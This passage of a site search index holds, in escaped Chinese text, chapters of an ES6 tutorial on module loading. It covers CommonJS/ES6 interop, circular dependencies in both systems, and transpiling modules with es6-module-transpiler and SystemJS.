\u4e0d\u6b63\u786e\nimport { readFile } from 'fs';\n</code></pre> <p>\u4e0a\u9762\u7684\u5199\u6cd5\u4e0d\u6b63\u786e\uff0c\u56e0\u4e3a<code>fs</code>\u662f CommonJS \u683c\u5f0f\uff0c\u53ea\u6709\u5728\u8fd0\u884c\u65f6\u624d\u80fd\u786e\u5b9a<code>readFile</code>\u63a5\u53e3\uff0c\u800c<code>import</code>\u547d\u4ee4\u8981\u6c42\u7f16\u8bd1\u65f6\u5c31\u786e\u5b9a\u8fd9\u4e2a\u63a5\u53e3\u3002\u89e3\u51b3\u65b9\u6cd5\u5c31\u662f\u6539\u4e3a\u6574\u4f53\u8f93\u5165\u3002</p> <pre><code>// \u6b63\u786e\u7684\u5199\u6cd5\u4e00\nimport * as express from 'express';\nconst app = express.default();\n\n// \u6b63\u786e\u7684\u5199\u6cd5\u4e8c\nimport express from 'express';\nconst app = express();\n</code></pre>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#commonjs-es6","title":"CommonJS \u6a21\u5757\u52a0\u8f7d ES6 \u6a21\u5757","text":"<p>CommonJS \u6a21\u5757\u52a0\u8f7d ES6 \u6a21\u5757\uff0c\u4e0d\u80fd\u4f7f\u7528<code>require</code>\u547d\u4ee4\uff0c\u800c\u8981\u4f7f\u7528<code>import()</code>\u51fd\u6570\u3002ES6 \u6a21\u5757\u7684\u6240\u6709\u8f93\u51fa\u63a5\u53e3\uff0c\u4f1a\u6210\u4e3a\u8f93\u5165\u5bf9\u8c61\u7684\u5c5e\u6027\u3002</p> <pre><code>// es.mjs\nlet foo = { bar: 'my-default' };\nexport default foo;\n\n// cjs.js\nconst es_namespace = await import('./es.mjs');\n// es_namespace = {\n//   get default() {\n//     ...\n//   }\n// }\nconsole.log(es_namespace.default);\n// { bar:'my-default' }\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>default</code>\u63a5\u53e3\u53d8\u6210\u4e86<code>es_namespace.default</code>\u5c5e\u6027\u3002</p> <p>\u4e0b\u9762\u662f\u53e6\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>// es.js\nexport let foo = { bar:'my-default' };\nexport { foo as bar };\nexport function f() {};\nexport class c {};\n\n// cjs.js\nconst es_namespace = await import('./es');\n// es_namespace = {\n//   get foo() {return foo;}\n//   get bar() {return foo;}\n//   get f() {return f;}\n//   get c() {return c;}\n// }\n</code></pre>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#_6","title":"\u5faa\u73af\u52a0\u8f7d","text":"<p>\u201c\u5faa\u73af\u52a0\u8f7d\u201d\uff08circular dependency\uff09\u6307\u7684\u662f\uff0c<code>a</code>\u811a\u672c\u7684\u6267\u884c\u4f9d\u8d56<code>b</code>\u811a\u672c\uff0c\u800c<code>b</code>\u811a\u672c\u7684\u6267\u884c\u53c8\u4f9d\u8d56<code>a</code>\u811a\u672c\u3002</p> <pre><code>// a.js\nvar b = require('b');\n\n// b.js\nvar a = require('a');\n</code></pre> <p>\u901a\u5e38\uff0c\u201c\u5faa\u73af\u52a0\u8f7d\u201d\u8868\u793a\u5b58\u5728\u5f3a\u8026\u5408\uff0c\u5982\u679c\u5904\u7406\u4e0d\u597d\uff0c\u8fd8\u53ef\u80fd\u5bfc\u81f4\u9012\u5f52\u52a0\u8f7d\uff0c\u4f7f\u5f97\u7a0b\u5e8f\u65e0\u6cd5\u6267\u884c\uff0c\u56e0\u6b64\u5e94\u8be5\u907f\u514d\u51fa\u73b0\u3002</p> <p>\u4f46\u662f\u5b9e\u9645\u4e0a\uff0c\u8fd9\u662f\u5f88\u96be\u907f\u514d\u7684\uff0c\u5c24\u5176\u662f\u4f9d\u8d56\u5173\u7cfb\u590d\u6742\u7684\u5927\u9879\u76ee\uff0c\u5f88\u5bb9\u6613\u51fa\u73b0<code>a</code>\u4f9d\u8d56<code>b</code>\uff0c<code>b</code>\u4f9d\u8d56<code>c</code>\uff0c<code>c</code>\u53c8\u4f9d\u8d56<code>a</code>\u8fd9\u6837\u7684\u60c5\u51b5\u3002\u8fd9\u610f\u5473\u7740\uff0c\u6a21\u5757\u52a0\u8f7d\u673a\u5236\u5fc5\u987b\u8003\u8651\u201c\u5faa\u73af\u52a0\u8f7d\u201d\u7684\u60c5\u51b5\u3002</p> <p>\u5bf9\u4e8e JavaScript \u8bed\u8a00\u6765\u8bf4\uff0c\u76ee\u524d\u6700\u5e38\u89c1\u7684\u4e24\u79cd\u6a21\u5757\u683c\u5f0f CommonJS \u548c ES6\uff0c\u5904\u7406\u201c\u5faa\u73af\u52a0\u8f7d\u201d\u7684\u65b9\u6cd5\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u8fd4\u56de\u7684\u7ed3\u679c\u4e5f\u4e0d\u4e00\u6837\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#commonjs","title":"CommonJS \u6a21\u5757\u7684\u52a0\u8f7d\u539f\u7406","text":"<p>\u4ecb\u7ecd ES6 \u5982\u4f55\u5904\u7406\u201c\u5faa\u73af\u52a0\u8f7d\u201d\u4e4b\u524d\uff0c\u5148\u4ecb\u7ecd\u76ee\u524d\u6700\u6d41\u884c\u7684 CommonJS \u6a21\u5757\u683c\u5f0f\u7684\u52a0\u8f7d\u539f\u7406\u3002</p> <p>CommonJS \u7684\u4e00\u4e2a\u6a21\u5757\uff0c\u5c31\u662f\u4e00\u4e2a\u811a\u672c\u6587\u4ef6\u3002<code>require</code>\u547d\u4ee4\u7b2c\u4e00\u6b21\u52a0\u8f7d\u8be5\u811a\u672c\uff0c\u5c31\u4f1a\u6267\u884c\u6574\u4e2a\u811a\u672c\uff0c\u7136\u540e\u5728\u5185\u5b58\u751f\u6210\u4e00\u4e2a\u5bf9\u8c61\u3002</p> <pre><code>{\n  id: '...',\n  exports: { ... },\n  loaded: true,\n  ...\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u5c31\u662f Node \u5185\u90e8\u52a0\u8f7d\u6a21\u5757\u540e\u751f\u6210\u7684\u4e00\u4e2a\u5bf9\u8c61\u3002\u8be5\u5bf9\u8c61\u7684<code>id</code>\u5c5e\u6027\u662f\u6a21\u5757\u540d\uff0c<code>exports</code>\u5c5e\u6027\u662f\u6a21\u5757\u8f93\u51fa\u7684\u5404\u4e2a\u63a5\u53e3\uff0c<code>loaded</code>\u5c5e\u6027\u662f\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6a21\u5757\u7684\u811a\u672c\u662f\u5426\u6267\u884c\u5b8c\u6bd5\u3002\u5176\u4ed6\u8fd8\u6709\u5f88\u591a\u5c5e\u6027\uff0c\u8fd9\u91cc\u90fd\u7701\u7565\u4e86\u3002</p> <p>\u4ee5\u540e\u9700\u8981\u7528\u5230\u8fd9\u4e2a\u6a21\u5757\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5230<code>exports</code>\u5c5e\u6027\u4e0a\u9762\u53d6\u503c\u3002\u5373\u4f7f\u518d\u6b21\u6267\u884c<code>require</code>\u547d\u4ee4\uff0c\u4e5f\u4e0d\u4f1a\u518d\u6b21\u6267\u884c\u8be5\u6a21\u5757\uff0c\u800c\u662f\u5230\u7f13\u5b58\u4e4b\u4e2d\u53d6\u503c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0cCommonJS \u6a21\u5757\u65e0\u8bba\u52a0\u8f7d\u591a\u5c11\u6b21\uff0c\u90fd\u53ea\u4f1a\u5728\u7b2c\u4e00\u6b21\u52a0\u8f7d\u65f6\u8fd0\u884c\u4e00\u6b21\uff0c\u4ee5\u540e\u518d\u52a0\u8f7d\uff0c\u5c31\u8fd4\u56de\u7b2c\u4e00\u6b21\u8fd0\u884c\u7684\u7ed3\u679c\uff0c\u9664\u975e\u624b\u52a8\u6e05\u9664\u7cfb\u7edf\u7f13\u5b58\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#commonjs_1","title":"CommonJS \u6a21\u5757\u7684\u5faa\u73af\u52a0\u8f7d","text":"<p>CommonJS \u6a21\u5757\u7684\u91cd\u8981\u7279\u6027\u662f\u52a0\u8f7d\u65f6\u6267\u884c\uff0c\u5373\u811a\u672c\u4ee3\u7801\u5728<code>require</code>\u7684\u65f6\u5019\uff0c\u5c31\u4f1a\u5168\u90e8\u6267\u884c\u3002\u4e00\u65e6\u51fa\u73b0\u67d0\u4e2a\u6a21\u5757\u88ab\"\u5faa\u73af\u52a0\u8f7d\"\uff0c\u5c31\u53ea\u8f93\u51fa\u5df2\u7ecf\u6267\u884c\u7684\u90e8\u5206\uff0c\u8fd8\u672a\u6267\u884c\u7684\u90e8\u5206\u4e0d\u4f1a\u8f93\u51fa\u3002</p> <p>\u8ba9\u6211\u4eec\u6765\u770b\uff0cNode \u5b98\u65b9\u6587\u6863\u91cc\u9762\u7684\u4f8b\u5b50\u3002\u811a\u672c\u6587\u4ef6<code>a.js</code>\u4ee3\u7801\u5982\u4e0b\u3002</p> <pre><code>exports.done = false;\nvar b = require('./b.js');\nconsole.log('\u5728 a.js \u4e4b\u4e2d\uff0cb.done = %j', b.done);\nexports.done = true;\nconsole.log('a.js \u6267\u884c\u5b8c\u6bd5');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e4b\u4e2d\uff0c<code>a.js</code>\u811a\u672c\u5148\u8f93\u51fa\u4e00\u4e2a<code>done</code>\u53d8\u91cf\uff0c\u7136\u540e\u52a0\u8f7d\u53e6\u4e00\u4e2a\u811a\u672c\u6587\u4ef6<code>b.js</code>\u3002\u6ce8\u610f\uff0c\u6b64\u65f6<code>a.js</code>\u4ee3\u7801\u5c31\u505c\u5728\u8fd9\u91cc\uff0c\u7b49\u5f85<code>b.js</code>\u6267\u884c\u5b8c\u6bd5\uff0c\u518d\u5f80\u4e0b\u6267\u884c\u3002</p> <p>\u518d\u770b<code>b.js</code>\u7684\u4ee3\u7801\u3002</p> <pre><code>exports.done = false;\nvar a = require('./a.js');\nconsole.log('\u5728 b.js \u4e4b\u4e2d\uff0ca.done = %j', a.done);\nexports.done = true;\nconsole.log('b.js \u6267\u884c\u5b8c\u6bd5');\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e4b\u4e2d\uff0c<code>b.js</code>\u6267\u884c\u5230\u7b2c\u4e8c\u884c\uff0c\u5c31\u4f1a\u53bb\u52a0\u8f7d<code>a.js</code>\uff0c\u8fd9\u65f6\uff0c\u5c31\u53d1\u751f\u4e86\u201c\u5faa\u73af\u52a0\u8f7d\u201d\u3002\u7cfb\u7edf\u4f1a\u53bb<code>a.js</code>\u6a21\u5757\u5bf9\u5e94\u5bf9\u8c61\u7684<code>exports</code>\u5c5e\u6027\u53d6\u503c\uff0c\u53ef\u662f\u56e0\u4e3a<code>a.js</code>\u8fd8\u6ca1\u6709\u6267\u884c\u5b8c\uff0c\u4ece<code>exports</code>\u5c5e\u6027\u53ea\u80fd\u53d6\u56de\u5df2\u7ecf\u6267\u884c\u7684\u90e8\u5206\uff0c\u800c\u4e0d\u662f\u6700\u540e\u7684\u503c\u3002</p> <p><code>a.js</code>\u5df2\u7ecf\u6267\u884c\u7684\u90e8\u5206\uff0c\u53ea\u6709\u4e00\u884c\u3002</p> <pre><code>exports.done = false;\n</code></pre> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e<code>b.js</code>\u6765\u8bf4\uff0c\u5b83\u4ece<code>a.js</code>\u53ea\u8f93\u5165\u4e00\u4e2a\u53d8\u91cf<code>done</code>\uff0c\u503c\u4e3a<code>false</code>\u3002</p> <p>\u7136\u540e\uff0c<code>b.js</code>\u63a5\u7740\u5f80\u4e0b\u6267\u884c\uff0c\u7b49\u5230\u5168\u90e8\u6267\u884c\u5b8c\u6bd5\uff0c\u518d\u628a\u6267\u884c\u6743\u4ea4\u8fd8\u7ed9<code>a.js</code>\u3002\u4e8e\u662f\uff0c<code>a.js</code>\u63a5\u7740\u5f80\u4e0b\u6267\u884c\uff0c\u76f4\u5230\u6267\u884c\u5b8c\u6bd5\u3002\u6211\u4eec\u5199\u4e00\u4e2a\u811a\u672c<code>main.js</code>\uff0c\u9a8c\u8bc1\u8fd9\u4e2a\u8fc7\u7a0b\u3002</p> <pre><code>var a = require('./a.js');\nvar b = require('./b.js');\nconsole.log('\u5728 main.js \u4e4b\u4e2d, a.done=%j, b.done=%j', a.done, b.done);\n</code></pre> <p>\u6267\u884c<code>main.js</code>\uff0c\u8fd0\u884c\u7ed3\u679c\u5982\u4e0b\u3002</p> <pre><code>$ node main.js\n\n\u5728 b.js \u4e4b\u4e2d\uff0ca.done = false\nb.js \u6267\u884c\u5b8c\u6bd5\n\u5728 a.js \u4e4b\u4e2d\uff0cb.done = true\na.js \u6267\u884c\u5b8c\u6bd5\n\u5728 main.js \u4e4b\u4e2d, a.done=true, b.done=true\n</code></pre> <p>\u4e0a\u9762\u7684\u4ee3\u7801\u8bc1\u660e\u4e86\u4e24\u4ef6\u4e8b\u3002\u4e00\u662f\uff0c\u5728<code>b.js</code>\u4e4b\u4e2d\uff0c<code>a.js</code>\u6ca1\u6709\u6267\u884c\u5b8c\u6bd5\uff0c\u53ea\u6267\u884c\u4e86\u7b2c\u4e00\u884c\u3002\u4e8c\u662f\uff0c<code>main.js</code>\u6267\u884c\u5230\u7b2c\u4e8c\u884c\u65f6\uff0c\u4e0d\u4f1a\u518d\u6b21\u6267\u884c<code>b.js</code>\uff0c\u800c\u662f\u8f93\u51fa\u7f13\u5b58\u7684<code>b.js</code>\u7684\u6267\u884c\u7ed3\u679c\uff0c\u5373\u5b83\u7684\u7b2c\u56db\u884c\u3002</p> <pre><code>exports.done = true;\n</code></pre> <p>\u603b\u4e4b\uff0cCommonJS \u8f93\u5165\u7684\u662f\u88ab\u8f93\u51fa\u503c\u7684\u62f7\u8d1d\uff0c\u4e0d\u662f\u5f15\u7528\u3002</p> <p>\u53e6\u5916\uff0c\u7531\u4e8e CommonJS \u6a21\u5757\u9047\u5230\u5faa\u73af\u52a0\u8f7d\u65f6\uff0c\u8fd4\u56de\u7684\u662f\u5f53\u524d\u5df2\u7ecf\u6267\u884c\u7684\u90e8\u5206\u7684\u503c\uff0c\u800c\u4e0d\u662f\u4ee3\u7801\u5168\u90e8\u6267\u884c\u540e\u7684\u503c\uff0c\u4e24\u8005\u53ef\u80fd\u4f1a\u6709\u5dee\u5f02\u3002\u6240\u4ee5\uff0c\u8f93\u5165\u53d8\u91cf\u7684\u65f6\u5019\uff0c\u5fc5\u987b\u975e\u5e38\u5c0f\u5fc3\u3002</p> <pre><code>var a = require('a'); // \u5b89\u5168\u7684\u5199\u6cd5\nvar foo = require('a').foo; // \u5371\u9669\u7684\u5199\u6cd5\n\nexports.good = function (arg) {\n  return a.foo('good', arg); // \u4f7f\u7528\u7684\u662f a.foo \u7684\u6700\u65b0\u503c\n};\n\nexports.bad = function (arg) {\n  return foo('bad', arg); // \u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u90e8\u5206\u52a0\u8f7d\u65f6\u7684\u503c\n};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5982\u679c\u53d1\u751f\u5faa\u73af\u52a0\u8f7d\uff0c<code>require('a').foo</code>\u7684\u503c\u5f88\u53ef\u80fd\u540e\u9762\u4f1a\u88ab\u6539\u5199\uff0c\u6539\u7528<code>require('a')</code>\u4f1a\u66f4\u4fdd\u9669\u4e00\u70b9\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#es6","title":"ES6 \u6a21\u5757\u7684\u5faa\u73af\u52a0\u8f7d","text":"<p>ES6 \u5904\u7406\u201c\u5faa\u73af\u52a0\u8f7d\u201d\u4e0e CommonJS \u6709\u672c\u8d28\u7684\u4e0d\u540c\u3002ES6 \u6a21\u5757\u662f\u52a8\u6001\u5f15\u7528\uff0c\u5982\u679c\u4f7f\u7528<code>import</code>\u4ece\u4e00\u4e2a\u6a21\u5757\u52a0\u8f7d\u53d8\u91cf\uff08\u5373<code>import foo from 'foo'</code>\uff09\uff0c\u90a3\u4e9b\u53d8\u91cf\u4e0d\u4f1a\u88ab\u7f13\u5b58\uff0c\u800c\u662f\u6210\u4e3a\u4e00\u4e2a\u6307\u5411\u88ab\u52a0\u8f7d\u6a21\u5757\u7684\u5f15\u7528\uff0c\u9700\u8981\u5f00\u53d1\u8005\u81ea\u5df1\u4fdd\u8bc1\uff0c\u771f\u6b63\u53d6\u503c\u7684\u65f6\u5019\u80fd\u591f\u53d6\u5230\u503c\u3002</p> <p>\u8bf7\u770b\u4e0b\u9762\u8fd9\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>// a.mjs\nimport {bar} from './b';\nconsole.log('a.mjs');\nconsole.log(bar);\nexport let foo = 'foo';\n\n// b.mjs\nimport {foo} from './a';\nconsole.log('b.mjs');\nconsole.log(foo);\nexport let bar = 'bar';\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>a.mjs</code>\u52a0\u8f7d<code>b.mjs</code>\uff0c<code>b.mjs</code>\u53c8\u52a0\u8f7d<code>a.mjs</code>\uff0c\u6784\u6210\u5faa\u73af\u52a0\u8f7d\u3002\u6267\u884c<code>a.mjs</code>\uff0c\u7ed3\u679c\u5982\u4e0b\u3002</p> <pre><code>$ node --experimental-modules a.mjs\nb.mjs\nReferenceError: foo is not defined\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6267\u884c<code>a.mjs</code>\u4ee5\u540e\u4f1a\u62a5\u9519\uff0c<code>foo</code>\u53d8\u91cf\u672a\u5b9a\u4e49\uff0c\u8fd9\u662f\u4e3a\u4ec0\u4e48\uff1f</p> <p>\u8ba9\u6211\u4eec\u4e00\u884c\u884c\u6765\u770b\uff0cES6 \u5faa\u73af\u52a0\u8f7d\u662f\u600e\u4e48\u5904\u7406\u7684\u3002\u9996\u5148\uff0c\u6267\u884c<code>a.mjs</code>\u4ee5\u540e\uff0c\u5f15\u64ce\u53d1\u73b0\u5b83\u52a0\u8f7d\u4e86<code>b.mjs</code>\uff0c\u56e0\u6b64\u4f1a\u4f18\u5148\u6267\u884c<code>b.mjs</code>\uff0c\u7136\u540e\u518d\u6267\u884c<code>a.mjs</code>\u3002\u63a5\u7740\uff0c\u6267\u884c<code>b.mjs</code>\u7684\u65f6\u5019\uff0c\u5df2\u77e5\u5b83\u4ece<code>a.mjs</code>\u8f93\u5165\u4e86<code>foo</code>\u63a5\u53e3\uff0c\u8fd9\u65f6\u4e0d\u4f1a\u53bb\u6267\u884c<code>a.mjs</code>\uff0c\u800c\u662f\u8ba4\u4e3a\u8fd9\u4e2a\u63a5\u53e3\u5df2\u7ecf\u5b58\u5728\u4e86\uff0c\u7ee7\u7eed\u5f80\u4e0b\u6267\u884c\u3002\u6267\u884c\u5230\u7b2c\u4e09\u884c<code>console.log(foo)</code>\u7684\u65f6\u5019\uff0c\u624d\u53d1\u73b0\u8fd9\u4e2a\u63a5\u53e3\u6839\u672c\u6ca1\u5b9a\u4e49\uff0c\u56e0\u6b64\u62a5\u9519\u3002</p> <p>\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u8ba9<code>b.mjs</code>\u8fd0\u884c\u7684\u65f6\u5019\uff0c<code>foo</code>\u5df2\u7ecf\u6709\u5b9a\u4e49\u4e86\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u5c06<code>foo</code>\u5199\u6210\u51fd\u6570\u6765\u89e3\u51b3\u3002</p> <pre><code>// a.mjs\nimport {bar} from './b';\nconsole.log('a.mjs');\nconsole.log(bar());\nfunction foo() { return 'foo' }\nexport {foo};\n\n// b.mjs\nimport {foo} from './a';\nconsole.log('b.mjs');\nconsole.log(foo());\nfunction bar() { return 'bar' }\nexport {bar};\n</code></pre> <p>\u8fd9\u65f6\u518d\u6267\u884c<code>a.mjs</code>\u5c31\u53ef\u4ee5\u5f97\u5230\u9884\u671f\u7ed3\u679c\u3002</p> <pre><code>$ node --experimental-modules a.mjs\nb.mjs\nfoo\na.mjs\nbar\n</code></pre> <p>\u8fd9\u662f\u56e0\u4e3a\u51fd\u6570\u5177\u6709\u63d0\u5347\u4f5c\u7528\uff0c\u5728\u6267\u884c<code>import {bar} from './b'</code>\u65f6\uff0c\u51fd\u6570<code>foo</code>\u5c31\u5df2\u7ecf\u6709\u5b9a\u4e49\u4e86\uff0c\u6240\u4ee5<code>b.mjs</code>\u52a0\u8f7d\u7684\u65f6\u5019\u4e0d\u4f1a\u62a5\u9519\u3002\u8fd9\u4e5f\u610f\u5473\u7740\uff0c\u5982\u679c\u628a\u51fd\u6570<code>foo</code>\u6539\u5199\u6210\u51fd\u6570\u8868\u8fbe\u5f0f\uff0c\u4e5f\u4f1a\u62a5\u9519\u3002</p> <pre><code>// a.mjs\nimport {bar} from './b';\nconsole.log('a.mjs');\nconsole.log(bar());\nconst foo = () =&gt; 'foo';\nexport {foo};\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u7684\u7b2c\u56db\u884c\uff0c\u6539\u6210\u4e86\u51fd\u6570\u8868\u8fbe\u5f0f\uff0c\u5c31\u4e0d\u5177\u6709\u63d0\u5347\u4f5c\u7528\uff0c\u6267\u884c\u5c31\u4f1a\u62a5\u9519\u3002</p> <p>\u6211\u4eec\u518d\u6765\u770b ES6 \u6a21\u5757\u52a0\u8f7d\u5668SystemJS\u7ed9\u51fa\u7684\u4e00\u4e2a\u4f8b\u5b50\u3002</p> <pre><code>// even.js\nimport { odd } from './odd'\nexport var counter = 0;\nexport function even(n) {\n  counter++;\n  return n === 0 || odd(n - 1);\n}\n\n// odd.js\nimport { even } from './even';\nexport function odd(n) {\n  return n !== 0 &amp;&amp; even(n - 1);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>even.js</code>\u91cc\u9762\u7684\u51fd\u6570<code>even</code>\u6709\u4e00\u4e2a\u53c2\u6570<code>n</code>\uff0c\u53ea\u8981\u4e0d\u7b49\u4e8e 0\uff0c\u5c31\u4f1a\u51cf\u53bb 1\uff0c\u4f20\u5165\u52a0\u8f7d\u7684<code>odd()</code>\u3002<code>odd.js</code>\u4e5f\u4f1a\u505a\u7c7b\u4f3c\u64cd\u4f5c\u3002</p> <p>\u8fd0\u884c\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\uff0c\u7ed3\u679c\u5982\u4e0b\u3002</p> <pre><code>$ babel-node\n&gt; import * as m from './even.js';\n&gt; m.even(10);\ntrue\n&gt; m.counter\n6\n&gt; m.even(20)\ntrue\n&gt; m.counter\n17\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53c2\u6570<code>n</code>\u4ece 10 \u53d8\u4e3a 0 \u7684\u8fc7\u7a0b\u4e2d\uff0c<code>even()</code>\u4e00\u5171\u4f1a\u6267\u884c 6 \u6b21\uff0c\u6240\u4ee5\u53d8\u91cf<code>counter</code>\u7b49\u4e8e 6\u3002\u7b2c\u4e8c\u6b21\u8c03\u7528<code>even()</code>\u65f6\uff0c\u53c2\u6570<code>n</code>\u4ece 20 \u53d8\u4e3a 0\uff0c<code>even()</code>\u4e00\u5171\u4f1a\u6267\u884c 11 \u6b21\uff0c\u52a0\u4e0a\u524d\u9762\u7684 6 \u6b21\uff0c\u6240\u4ee5\u53d8\u91cf<code>counter</code>\u7b49\u4e8e 17\u3002</p> <p>\u8fd9\u4e2a\u4f8b\u5b50\u8981\u662f\u6539\u5199\u6210 CommonJS\uff0c\u5c31\u6839\u672c\u65e0\u6cd5\u6267\u884c\uff0c\u4f1a\u62a5\u9519\u3002</p> <pre><code>// even.js\nvar odd = require('./odd');\nvar counter = 0;\nexports.counter = counter;\nexports.even = function (n) {\n  counter++;\n  return n == 0 || odd(n - 1);\n}\n\n// odd.js\nvar even = require('./even').even;\nmodule.exports = function (n) {\n  return n != 0 &amp;&amp; even(n - 1);\n}\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c<code>even.js</code>\u52a0\u8f7d<code>odd.js</code>\uff0c\u800c<code>odd.js</code>\u53c8\u53bb\u52a0\u8f7d<code>even.js</code>\uff0c\u5f62\u6210\u201c\u5faa\u73af\u52a0\u8f7d\u201d\u3002\u8fd9\u65f6\uff0c\u6267\u884c\u5f15\u64ce\u5c31\u4f1a\u8f93\u51fa<code>even.js</code>\u5df2\u7ecf\u6267\u884c\u7684\u90e8\u5206\uff08\u4e0d\u5b58\u5728\u4efb\u4f55\u7ed3\u679c\uff09\uff0c\u6240\u4ee5\u5728<code>odd.js</code>\u4e4b\u4e2d\uff0c\u53d8\u91cf<code>even</code>\u7b49\u4e8e<code>undefined</code>\uff0c\u7b49\u5230\u540e\u9762\u8c03\u7528<code>even(n - 1)</code>\u5c31\u4f1a\u62a5\u9519\u3002</p> <pre><code>$ node\n&gt; var m = require('./even');\n&gt; m.even(10)\nTypeError: even is not a function\n</code></pre>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#es6_1","title":"ES6 \u6a21\u5757\u7684\u8f6c\u7801","text":"<p>\u6d4f\u89c8\u5668\u76ee\u524d\u8fd8\u4e0d\u652f\u6301 ES6 \u6a21\u5757\uff0c\u4e3a\u4e86\u73b0\u5728\u5c31\u80fd\u4f7f\u7528\uff0c\u53ef\u4ee5\u5c06\u5176\u8f6c\u4e3a ES5 \u7684\u5199\u6cd5\u3002\u9664\u4e86 Babel \u53ef\u4ee5\u7528\u6765\u8f6c\u7801\u4e4b\u5916\uff0c\u8fd8\u6709\u4ee5\u4e0b\u4e24\u4e2a\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u7528\u6765\u8f6c\u7801\u3002</p>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#es6-module-transpiler","title":"ES6 module transpiler","text":"<p>ES6 module transpiler\u662f square \u516c\u53f8\u5f00\u6e90\u7684\u4e00\u4e2a\u8f6c\u7801\u5668\uff0c\u53ef\u4ee5\u5c06 ES6 \u6a21\u5757\u8f6c\u4e3a CommonJS \u6a21\u5757\u6216 AMD \u6a21\u5757\u7684\u5199\u6cd5\uff0c\u4ece\u800c\u5728\u6d4f\u89c8\u5668\u4e2d\u4f7f\u7528\u3002</p> <p>\u9996\u5148\uff0c\u5b89\u88c5\u8fd9\u4e2a\u8f6c\u7801\u5668\u3002</p> <pre><code>$ npm install -g es6-module-transpiler\n</code></pre> <p>\u7136\u540e\uff0c\u4f7f\u7528<code>compile-modules convert</code>\u547d\u4ee4\uff0c\u5c06 ES6 \u6a21\u5757\u6587\u4ef6\u8f6c\u7801\u3002</p> <pre><code>$ compile-modules convert file1.js file2.js\n</code></pre> <p><code>-o</code>\u53c2\u6570\u53ef\u4ee5\u6307\u5b9a\u8f6c\u7801\u540e\u7684\u6587\u4ef6\u540d\u3002</p> <pre><code>$ compile-modules convert -o out.js file1.js\n</code></pre>"},{"location":"ebook-JSES6-RYF/24-Module%20%E7%9A%84%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0/#systemjs","title":"SystemJS","text":"<p>\u53e6\u4e00\u79cd\u89e3\u51b3\u65b9\u6cd5\u662f\u4f7f\u7528 SystemJS\u3002\u5b83\u662f\u4e00\u4e2a\u57ab\u7247\u5e93\uff08polyfill\uff09\uff0c\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u5185\u52a0\u8f7d ES6 \u6a21\u5757\u3001AMD \u6a21\u5757\u548c CommonJS \u6a21\u5757\uff0c\u5c06\u5176\u8f6c\u4e3a ES5 \u683c\u5f0f\u3002\u5b83\u5728\u540e\u53f0\u8c03\u7528\u7684\u662f Google \u7684 Traceur \u8f6c\u7801\u5668\u3002</p> <p>\u4f7f\u7528\u65f6\uff0c\u5148\u5728\u7f51\u9875\u5185\u8f7d\u5165<code>system.js</code>\u6587\u4ef6\u3002</p> <pre><code>&lt;script src=\"system.js\"&gt;&lt;/script&gt;\n</code></pre> <p>\u7136\u540e\uff0c\u4f7f\u7528<code>System.import</code>\u65b9\u6cd5\u52a0\u8f7d\u6a21\u5757\u6587\u4ef6\u3002</p> <pre><code>&lt;script&gt;\n  System.import('./app.js');\n&lt;/script&gt;\n</code></pre> <p>\u4e0a\u9762\u4ee3\u7801\u4e2d\u7684<code>./app</code>\uff0c\u6307\u7684\u662f\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 app.js \u6587\u4ef6\u3002\u5b83\u53ef\u4ee5\u662f ES6 \u6a21\u5757\u6587\u4ef6\uff0c<code>System.import</code>\u4f1a\u81ea\u52a8\u5c06\u5176\u8f6c\u7801\u3002</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c<code>System.import</code>\u4f7f\u7528\u5f02\u6b65\u52a0\u8f7d\uff0c\u8fd4\u56de\u4e00\u4e2a Promise \u5bf9\u8c61\uff0c\u53ef\u4ee5\u9488\u5bf9\u8fd9\u4e2a\u5bf9\u8c61\u7f16\u7a0b\u3002\u4e0b\u9762\u662f\u4e00\u4e2a\u6a21\u5757\u6587\u4ef6\u3002</p> <pre><code>// 